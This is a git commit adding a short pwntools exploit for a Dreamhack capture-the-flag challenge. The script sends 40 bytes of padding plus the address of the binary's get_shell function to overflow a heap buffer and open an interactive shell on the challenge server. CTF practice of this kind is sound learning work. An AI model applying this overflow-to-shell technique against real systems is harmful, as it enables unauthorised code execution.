ecbf50092aa67f95cd387f6c8488b80b14446025
hogbal <hogbal31@gmail.com>
2020-07-25 06:25:31 -0700

    basic heap overflow

--- dreamhack.io/basic_heap_overflow/basic_heap_overflow.py
+++ dreamhack.io/basic_heap_overflow/basic_heap_overflow.py
@@ -1,6 +1,15 @@
 from pwn import *
 context.log_level='debug'
 
-n = remote('host1.dreamhack.games',8367)
+n = remote('host1.dreamhack.games',8397)
+elf = ELF('./basic_heap_overflow')
+
+get_shell = elf.symbols['get_shell']
+
+payload = b'A'*40
+payload += p32(get_shell)
+
+n.send(payload)
+success(payload.hex())
 
 n.interactive()
